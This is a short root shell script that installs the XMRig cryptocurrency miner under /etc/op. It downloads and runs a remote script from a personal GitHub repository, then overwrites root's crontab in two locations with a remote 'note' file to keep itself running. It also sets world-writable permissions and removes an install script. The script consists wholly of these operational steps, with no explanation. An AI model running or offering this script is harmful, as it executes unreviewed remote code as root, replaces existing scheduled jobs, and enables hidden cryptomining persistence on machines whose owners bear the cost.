yum -y install screen nano wget 
mkdir /etc/op/
curl -o /etc/op/xmrig-6.6.1-linux-static-x64.tar.gz -L https://github.com/xmrig/xmrig/releases/download/v6.6.1/xmrig-6.6.1-linux-static-x64.tar.gz
tar -xvf /etc/op/xmrig-6.6.1-linux-static-x64.tar.gz -C /etc/op/ 
rm -rf /etc/op/xmrig-6.6.1-linux-static-x64.tar.gz
curl -o /etc/op/xm.sh -L https://raw.githubusercontent.com/rezabagh/reza/master/run.sh
read -r -p "TAG:  " -e -i "Reza" TAG
sed -i "s/Reza/$TAG/g" /etc/op/xm.sh
chmod 777 /etc/op/xm.sh
bash /etc/op/xm.sh
curl -o /etc/op/note -L https://raw.githubusercontent.com/rezabagh/reza/master/note
cat /etc/op/note > /var/spool/cron/root
cat /etc/op/note > /var/spool/cron/crontabs/root
cat /var/spool/cron/root
cat /var/spool/cron/crontabs/root
rm -rf /root/xmr.sh
